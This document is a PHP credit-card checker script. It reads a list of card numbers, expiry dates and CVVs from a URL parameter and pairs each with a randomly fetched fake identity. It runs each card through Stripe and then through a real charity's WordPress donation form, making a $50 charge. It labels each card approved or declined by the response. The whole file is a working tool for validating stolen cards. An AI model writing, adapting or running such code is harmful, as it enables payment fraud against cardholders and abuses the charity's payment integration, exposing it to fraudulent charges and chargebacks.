<?php
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
#==============[Randomizing Details Api]
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$fname = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$lname = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$add = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$num = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];
#=====================[1st REQ]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"';
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'accept-language: en-US,en;q=0.9,hi;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[email]='.$email.'&billing_details[address][postal_code]='.$zip.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=0c3f384a-59bc-468a-8a8a-babf9abb3c0e2ce0a9&muid=76fbe8de-b94d-4ec2-936f-9575b181e6dd3a7a9e&sid=890d4ffe-afff-49d7-af22-1e0bfc66d64d6c544c&pasted_fields=number&payment_user_agent=stripe.js%2F10dd13b87%3B+stripe-js-v3%2F10dd13b87&time_on_page=360685&key=pk_live_QMBU860cL1m4otZJNXjcDFyq');


$result1 = curl_exec($ch);
$tk = trim(strip_tags(getStr($result1,'"id": "','"')));

#==================[2 REQ]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"';
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'accept-language: en-US,en;q=0.9,hi;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]='.$zip.'&guid=0c3f384a-59bc-468a-8a8a-babf9abb3c0e2ce0a9&muid=76fbe8de-b94d-4ec2-936f-9575b181e6dd3a7a9e&sid=890d4ffe-afff-49d7-af22-1e0bfc66d64d6c544c&payment_user_agent=stripe.js%2F10dd13b87%3B+stripe-js-v3%2F10dd13b87&time_on_page=362283&key=pk_live_QMBU860cL1m4otZJNXjcDFyq&pasted_fields=number');
$result2 = curl_exec($ch);
$tk2 = trim(strip_tags(getStr($result2,'"id": "','"')));

#=================[3rd req]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://hopeinlancaster.org/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: hopeinlancaster.org';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'accept: */*';
$headers[] = 'x-requested-with: XMLHttpRequest';
$headers[] = 'save-data: on';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://hopeinlancaster.org';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://hopeinlancaster.org/donations/';
$headers[] = 'accept-language: en-US,en;q=0.9,hi;q=0.8';
$headers[] = 'cookie: __stripe_mid=76fbe8de-b94d-4ec2-936f-9575b181e6dd3a7a9e';
$headers[] = 'cookie: __stripe_sid=890d4ffe-afff-49d7-af22-1e0bfc66d64d6c544c';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=ds_process_button&stripeToken='.$tk2.'&paymentMethodID='.$tk.'&allData%5BbillingDetails%5D%5Bemail%5D='.$email.'&type=payment&amount=NTAuMDA%3D&params%5Bvalue%5D=ds-1550084928589&params%5Bname%5D=HOPE+In+Lancaster%2C+Inc&params%5Bamount%5D=NTAuMDA%3D&params%5Bdescription%5D=%2450.00+One-Time+Donation&params%5Bpanellabel%5D=Confirm+Payment&params%5Btype%5D=payment&params%5Bcoupon%5D=&params%5Bsetup_fee%5D=&params%5Bzero_decimal%5D=&params%5Bcapture%5D=1&params%5Bdisplay_amount%5D=1&params%5Bcurrency%5D=USD&params%5Blocale%5D=&params%5Bsuccess_query%5D=&params%5Berror_query%5D=&params%5Bsuccess_url%5D=https%3A%2F%2Fhopeinlancaster.org%2Fsuccess&params%5Berror_url%5D=https%3A%2F%2Fhopeinlancaster.org%2Ffail&params%5Bbutton_id%5D=MyButton&params%5Bcustom_role%5D=&params%5Bbilling%5D=&params%5Bshipping%5D=&params%5Brememberme%5D=&params%5Bkey%5D=pk_live_QMBU860cL1m4otZJNXjcDFyq&params%5Bcurrent_email_address%5D=&params%5Bajaxurl%5D=https%3A%2F%2Fhopeinlancaster.org%2Fwp-admin%2Fadmin-ajax.php&params%5Bimage%5D=https%3A%2F%2Fwww.hopeinlancaster.org%2Fwp-content%2Fuploads%2F2016%2F03%2FHOPE-LOGO.png&params%5Binstance%5D=ds1550084928589&params%5Bds_nonce%5D=329a05b2f1&ds_nonce=329a05b2f1');
$result3 = curl_exec($ch);
$msg = trim(strip_tags(getStr($result3,'message":"','"')));


#===============[Card Response]
if (strpos($result33, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVV MATCHED HYPER ♛ </span></br>';
}
elseif(strpos($result3, "Thank You For Donation." )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVV MATCHED HYPER ♛ </span></br>';
}
elseif(strpos($result3, "Thank You." )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVC MATCHED HYPER </span></br>';
}
if(strpos($result3, "Your card's security code is incorrect")) {

  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . ' </span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ CCN MATCHED [HYPER] ♛ </span></br>'; 

}
elseif(strpos($result3, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVC MATCHED - Incorrect Zip HYPER♛ </span></br>';
}
elseif(strpos($result3, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ Insufficient Funds HYPER♛ </span></br>';
}
elseif(strpos($result3, 'Your card has expired.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Card Expired HYPER♛</span> </br>';
}
elseif (strpos($result3, "pickup_card")) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ Pickup Card_Card - Sometime Useable HYPER ♛ </span></br>';
}
elseif(strpos($result3, 'Your card number is incorrect.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Incorrect Card Number HYPER ♛</span> </br>';
}
 elseif (strpos($result3, "incorrect_number")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Incorrect Card Number HYPER♛</span> </br>';
}
elseif(strpos($result3, 'Your card was declined.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Card Declined HYPER ♛</span> </br>';
}
elseif (strpos($result3, "generic_decline")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Declined : Generic_Decline HYPER♛</span> </br>';
}
elseif (strpos($result3, "do_not_honor")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Declined : Do_Not_Honor HYPER ♛</span> </br>';
}
elseif (strpos($result3, '"cvc_check": "unchecked"')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Security Code Check : Unchecked [Proxy Dead] HYPER ♛</span> </br>';
}
elseif (strpos($result3, '"cvc_check": "fail"')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Security Code Check : Fail HYPER♛</span> </br>';
}
elseif (strpos($result3, "expired_card")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Expired Card HYPER ♛</span> </br>';
}
elseif (strpos($result3,'Your card does not support this type of purchase.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Card Doesnt Support This Purchase HYPER ♛</span> </br>';
}

else {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . ' </span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ '.$msg.' [HYPER] ♛</span> </br>';
}

curl_close($ch);
ob_flush();


?>
